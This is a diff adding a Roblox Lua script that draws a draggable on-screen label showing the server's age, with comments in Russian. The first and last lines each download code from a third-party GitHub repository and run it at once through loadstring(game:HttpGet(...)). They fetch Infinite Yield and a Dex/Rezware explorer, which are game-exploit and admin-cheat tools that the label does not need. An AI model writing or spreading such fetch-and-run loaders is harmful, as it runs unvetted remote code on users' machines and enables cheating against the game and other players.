@@ -1,0 +1,72 @@
+loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
+
+local Players = game:GetService("Players")
+local player = Players.LocalPlayer
+local gui = player:WaitForChild("PlayerGui")
+local main = gui:WaitForChild("Main")
+local topbar = main:WaitForChild("Topbar")
+local serverInfo = topbar:WaitForChild("ServerInfo")
+local serverAge = serverInfo:WaitForChild("ServerAge")
+
+-- Создание окошка
+local screenGui = Instance.new("ScreenGui")
+local textLabel = Instance.new("TextLabel")
+
+screenGui.Parent = gui
+textLabel.Parent = screenGui
+
+textLabel.Size = UDim2.new(0, 200, 0, 50)
+textLabel.Position = UDim2.new(0.5, -100, 0.5, -25)
+textLabel.BackgroundColor3 = Color3.new(0, 0, 0)
+textLabel.TextColor3 = Color3.new(1, 1, 1)
+textLabel.TextScaled = true
+textLabel.ZIndex = 10 -- Устанавливаем ZIndex для отображения поверх всех остальных GUI
+
+-- Функция для обновления текста
+local function updateText()
+    local text = serverAge.Text
+    textLabel.Text = string.sub(text, -8)
+end
+
+-- Обновление текста каждую секунду
+spawn(function()
+    while true do
+        updateText()
+        wait(1)
+    end
+end)
+
+-- Функция для перемещения окошка
+local dragging = false
+local dragInput, mousePos, framePos
+
+textLabel.InputBegan:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 then
+        dragging = true
+        mousePos = input.Position
+        framePos = textLabel.Position
+
+        input.Changed:Connect(function()
+            if input.UserInputState == Enum.UserInputState.End then
+                dragging = false
+            end
+        end)
+    end
+end)
+
+textLabel.InputChanged:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseMovement then
+        dragInput = input
+    end
+end)
+
+game:GetService("UserInputService").InputChanged:Connect(function(input)
+    if input == dragInput and dragging then
+        local delta = input.Position - mousePos
+        textLabel.Position = UDim2.new(framePos.X.Scale, framePos.X.Offset + delta.X, framePos.Y.Scale, framePos.Y.Offset + delta.Y)
+    end
+end)
+
+wait(2)
+
+loadstring(game:HttpGet('https://raw.githubusercontent.com/MassiveHubs/loadstring/refs/heads/main/DexXenoAndRezware'))()
